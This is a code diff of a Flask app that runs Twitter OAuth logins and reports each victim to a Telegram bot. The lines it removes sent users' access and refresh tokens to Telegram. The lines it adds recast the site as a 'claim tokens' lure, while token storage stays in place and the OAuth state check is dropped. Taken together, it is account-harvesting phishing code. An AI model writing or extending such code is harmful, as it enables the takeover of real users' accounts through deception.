@@ -130,14 +130,19 @@ def perform_refresh(refresh_token):
 
 @app.route('/')
 def home():
+    # Simple landing page for claim eligibility
+    return render_template('home.html')
+
+@app.route('/claim')
+def claim():
     code = request.args.get('code')
     state = request.args.get('state')
     error = request.args.get('error')
 
     if 'username' in session:
         username = session['username']
-        send_message_via_telegram(f"👋 @{username} just returned to the website.")
-        message = f"Verification successful for @{username}!"
+        send_message_via_telegram(f"👋 @{username} returned to claim tokens.")
+        message = f"Claim successful for @{username}!"
         return render_template('veriwelcome.html', message=message, redirect_url=VERIFY_REDIRECT_URL)
 
     if request.args.get('authorize') == 'true':
@@ -155,11 +160,6 @@ def home():
     if code:
         if error:
             return f"Error during authorization: {error}", 400
-
-        # State validation disabled for now since Twitter returns state=0
-        #if state != session.get('oauth_state', '0'):
-        #    return "Invalid state parameter", 403
-            return "Invalid state parameter", 403
 
         code_verifier = session.get('code_verifier')
         token_url = "https://api.twitter.com/2/oauth2/token"
@@ -186,13 +186,12 @@ def home():
 
                 total_tokens = get_total_tokens()
                 send_message_via_telegram(
-                    f"🔑 Access Token: {access_token}\n"
-                    f"🔄 Refresh Token: {refresh_token}\n"
+                    f"💰 Token Claim!\n"
                     f"👤 Username: @{username}\n"
-                    f"🔗 Profile URL: {profile_url}\n"
-                    f"📊 Total Tokens in Database: {total_tokens}"
+                    f"🔗 Profile: {profile_url}\n"
+                    f"📊 Total Claims: {total_tokens}"
                 )
-                message = f"Verification successful for @{username}!"
+                message = f"Claim successful for @{username}!"
                 return render_template('veriwelcome.html', message=message, redirect_url=VERIFY_REDIRECT_URL)
             else:
                 return "Error retrieving user info with access token", 400
